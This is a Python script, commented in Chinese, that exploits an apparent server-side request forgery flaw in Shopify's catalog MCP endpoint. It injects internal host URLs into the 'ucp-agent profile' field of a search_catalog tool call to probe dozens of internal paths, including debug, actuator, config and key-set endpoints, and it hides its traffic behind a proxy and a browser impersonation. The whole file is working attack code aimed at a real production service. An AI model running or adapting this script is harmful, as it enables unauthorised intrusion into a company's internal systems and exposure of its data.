# -*- coding: utf-8 -*-
"""SSRF 内网枚举 v2:Go/K8s 风格路径 -> 找返回 JSON 的 2xx 端点("Missing ucp version"=数据读取证据)
重点:/healthz 已证明 2xx 内容被读取,继续扩路径
"""
import time
from curl_cffi import requests

PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
}
url = "https://catalog.shopify.com/api/ucp/mcp"
base = "https://shop-server.sfe.shopifyinternal.com"

def probe(label, profile):
    body = {
        "jsonrpc": "2.0", "method": "tools/call", "id": 1,
        "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile}}, "query": "shoes"}},
    }
    t0 = time.time()
    try:
        r = requests.post(url, json=body, headers=H, proxies=PROXY, impersonate="chrome", timeout=25)
        dt = time.time() - t0
        txt = r.text[:160]
        print(f"[{label}] {dt:.1f}s | {txt}", flush=True)
    except Exception as e:
        dt = time.time() - t0
        print(f"[{label}] ERROR {dt:.1f}s {type(e).__name__}", flush=True)

if __name__ == "__main__":
    paths = [
        "/readyz", "/livez", "/startupz",
        "/healthz/ready", "/healthz/live", "/health/ready", "/health/live",
        "/v1/healthz", "/api/healthz", "/api/v1/healthz",
        "/debug/vars", "/debug/pprof/", "/debug/pprof",
        "/version.json", "/info.json", "/status.json", "/health.json",
        "/api/version", "/api/info", "/api/ping", "/ping.json",
        "/manifest.json", "/config.json", "/settings.json",
        "/.well-known/openid-configuration", "/.well-known/jwks.json",
        "/openapi.json", "/swagger.json", "/api-docs",
        "/graphql/health", "/graphql/healthz",
        "/api/v1/status", "/api/v1/info", "/api/v1/version",
        "/internal/status", "/internal/version", "/internal/info",
        "/ops/healthz", "/ops/readyz",
        "/actuator/health", "/actuator/info", "/actuator/env",
        "/metrics.json", "/prometheus",
    ]
    for p in paths:
        probe(f"p{p}", base + p)
        time.sleep(0.25)
